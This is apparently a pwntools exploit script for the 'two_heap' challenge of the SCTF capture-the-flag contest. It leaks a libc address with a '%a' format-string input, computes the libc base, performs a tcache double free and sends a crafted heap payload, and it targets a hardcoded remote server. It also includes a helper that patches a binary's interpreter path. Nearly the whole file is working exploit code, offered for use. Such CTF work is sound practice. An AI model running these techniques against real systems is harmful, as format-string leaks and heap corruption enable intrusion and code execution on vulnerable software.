from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
#example
elf = change_ld('./pwn', './ld.so')
p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})

if debug:
    p = process("./two_heap",env = {"LD_PRELOAD_PATH":"./lib","LD_PRELOAD":"./ld.so.2 ./libc-2.26.so"})#libc-2.26.so"})
    libc = ELF("./libc-2.26.so")
    elf = ELF("./two_heap")
else:
    p = remote("47.104.89.129","10002")
    libc = ELF("./libc-2.26.so")
    elf = ELF("./two_heap")

def menu(choice):
    p.sendlineafter("Your choice:",str(choice))

def add(size,content):
    menu(1)
    p.sendlineafter("Input the size:\n",str(size))
    p.sendafter("Input the note:\n",content)

def free(index):
    menu(2)
    p.sendlineafter("Input the index:\n",str(index))

code_base = 0x555555554000
def debugf():
    if debug:
        gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x147a)))
        #gdb.attach(p,"b __printf_chk")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
p.sendafter("Welcome to SCTF:\n","%a%a%a%a%a\n")
info = p.recvuntil("\n",drop = True)
log.success("info:" + info)
info = info.split("0x0.0")[1].split("p")[0]
info = info.ljust(12,"0")
info = "0x" + info
leak_addr = int(info,16)
log.success("leak_addr:" + hex(leak_addr))
libc.address = leak_addr - libc.symbols["_IO_2_1_stdout_"]
log.success("libc_base:" + hex(libc.address))
add(0x70,"\n")
add(0x8,"a"*0x8)
free(1)
free(1)
add(0x10,"\n")
add(0,"")
payload = "\x00" * 6 + p64(0) + p64(0xffffffffffffffff)
add(0x18,payload + "\n")
#debugf()
p.interactive()
